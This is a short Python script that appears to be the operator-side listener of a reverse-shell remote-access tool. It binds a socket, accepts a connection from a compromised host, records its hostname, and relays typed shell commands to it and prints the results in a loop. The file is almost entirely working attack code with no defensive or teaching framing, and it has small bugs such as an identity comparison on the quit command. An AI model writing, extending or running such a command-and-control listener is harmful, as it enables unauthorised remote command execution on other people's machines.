import os
import sys
import socket
from data import HOST, PORT, ENCODING


def create_socket(host, port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((host, port))
        server.listen(1)
        os.system("cls")
        print("[+] I'm listening...")
    except socket.error as msg:
        print(f"[+] Socket binding error: {msg}.")
        server.close()
        sys.exit(1)
    return server

def handle_msg(server):
    try:
        global conn
        global addr
        global hostname
        conn, addr = server.accept()
        print(f"[+] Session opened at {addr[0]}: {addr[1]}")
        hostname = conn.recv(1024).decode(ENCODING)
        menu()
    except socket.error as msg:
        print(f"[+] Socket accepting error: {msg}.")

def menu():
    while True:
        cmd = input(f"{addr[0]}@{hostname}> ")
        if cmd is 'quit':
            conn.close()
            server.close()
            sys.exit()
        command = conn.send(cmd.encode(ENCODING))
        result = conn.recv(16834)
        print(result.decode(ENCODING))
        # print(result)

server = create_socket(HOST, PORT)
handle_msg(server)
